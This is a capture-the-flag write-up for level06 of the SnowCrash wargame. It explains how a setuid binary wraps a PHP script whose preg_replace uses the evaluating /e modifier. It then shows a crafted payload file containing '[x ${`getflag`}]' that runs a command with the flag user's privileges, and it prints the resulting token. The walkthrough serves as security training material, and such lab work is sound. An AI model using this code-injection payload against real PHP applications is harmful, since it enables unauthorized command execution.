In home directory there are executable file and PHP script:
```shell
level06@SnowCrash:~$  ls -la
total 24
[...]
-rwsr-x---+ 1 flag06  level06 7503 Aug 30  2015 level06
-rwxr-x---  1 flag06  level06  356 Mar  5  2016 level06.php
```
Let's reading the script file:
```shell
level06@SnowCrash:~$ cat level06.php 
#!/usr/bin/php
<?php
function y($m) { $m = preg_replace("/\./", " x ", $m); $m = preg_replace("/@/", " y", $m); return $m; }
function x($y, $z) { $a = file_get_contents($y); $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a); $a = preg_replace("/\[/", "(", $a); $a = preg_replace("/\]/", ")", $a); return $a; }
$r = x($argv[1], $argv[2]); print $r;
?>
```
<"/(\[x (.*)\])/e"> this regex use deprecated and vunerable regex 'e' modifier. [Read more](https://stackoverflow.com/questions/16986331/can-someone-explain-the-e-regex-modifier)
And it will eveluate this (`.*`).
Our executable wait for an argument to use with it:
```shell
level06@SnowCrash:~$ ./level06
PHP Warning:  file_get_contents(): Filename cannot be empty in /home/user/level06/level06.php on line 4
```
So we can write a file which will much the regex <"/(\[x (.*)\])/e"> and use it with our exec file (it with SUID bit)
```shell
level06@SnowCrash:~$ echo '[x ${`getflag`}]' > /tmp/getflag
level06@SnowCrash:~$ ./level06 /tmp/getflag
PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
 in /home/user/level06/level06.php(4) : regexp code on line 1
```
